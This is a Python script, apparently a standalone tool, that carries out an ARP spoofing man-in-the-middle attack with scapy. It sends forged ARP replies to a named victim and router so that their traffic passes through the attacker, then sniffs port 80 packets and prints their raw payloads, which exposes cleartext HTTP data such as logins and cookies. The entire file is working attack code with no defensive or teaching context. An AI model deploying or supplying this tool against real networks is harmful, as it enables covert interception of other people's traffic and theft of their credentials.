#!/usr/bin/env python3
from scapy.all import *
from threading import Thread
from binascii import unhexlify
import argparse
from time import sleep
from sys import exit
import atexit

# persing the options
parser = argparse.ArgumentParser(description="*ARP Spoofing Tool*")
parser.add_argument('-i', '--interface', required=True, type=str, help="NIC Name") #'Interface', 
parser.add_argument('-r', '--routerIP', required=True, type=str, help="Router ip address") #"RouterIP", 
parser.add_argument('-v', '--victimIP', required=True, type=str, help="Victim ip address") #"VictimIP", 
args = parser.parse_args()

deviceMac = get_if_hwaddr(args.interface)

def getMac(ip: str):
    mac = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), verbose=False, timeout=3) #type:ignore
    if mac is None:
        getMac(ip)
    else:
        print(f'[+] device mac address {ip} ==> {mac[ARP].hwsrc}') #type:ignore
        return mac[ARP].hwsrc #type:ignore
    
# getting the mac address for each device
macVic = getMac(args.victimIP)
macRot = getMac(args.routerIP)
def victim():
    arp = Ether(dst=macVic)/ARP(op=2, #type:ignore
                      hwsrc = deviceMac,
                      psrc = args.routerIP,
                      
                      hwdst = macVic,
                      pdst = args.victimIP
                      )
    sendp(arp, verbose=False)

def rot():
    arp = Ether(dst=macRot)/ARP(op=2, #type:ignore
                      hwsrc = deviceMac,    
                      psrc = args.victimIP,

                      hwdst = macRot,
                      pdst = args.routerIP
                      )
    sendp(arp, verbose=False)

def sendARPSpoof():
    try:
        while True:
            victim()
            rot()
            sleep(1)
    except KeyboardInterrupt:
        print('[-] exiting sendARPSpoof thread...')

def restore():
    print('\n[+] Restoring targets...')
    # restore victim
    sendp(Ether(dst=macVic)/ARP(op=2, #type:ignore
                                hwsrc=macRot,
                                psrc=args.routerIP,
                                hwdst=macVic,
                                pdst=args.victimIP), count=7, verbose=False)
    # restore router
    sendp(Ether(dst=macRot)/ARP(op=2, #type:ignore
                                hwsrc=macVic,
                                psrc=args.victimIP,
                                hwdst=macRot,
                                pdst=args.routerIP), count=7, verbose=False)
    print('[+] Restoration complete.')

def filterData(pkt):
    try:
        if pkt.haslayer(Raw):
            print('=' * 60)
            print(pkt[Raw].load.decode())
            print('=' * 60)
    except UnicodeError:
        pass

atexit.register(restore)

# creating thread for sending arp packets
thread = Thread(target=sendARPSpoof, daemon=True)
thread.start()

# creating thread for running sniffing 
spoofing = Thread(target=sniff, kwargs={
    'iface': args.interface,
    'prn': filterData,
    'filter':'port 80'
    }, 
    daemon=True)
spoofing.start()

try:
    # This loop keeps the main thread alive without hogging resources.
    while True:
        sleep(1)
except KeyboardInterrupt:
    print('[-] Exiting script...')
    exit(0)
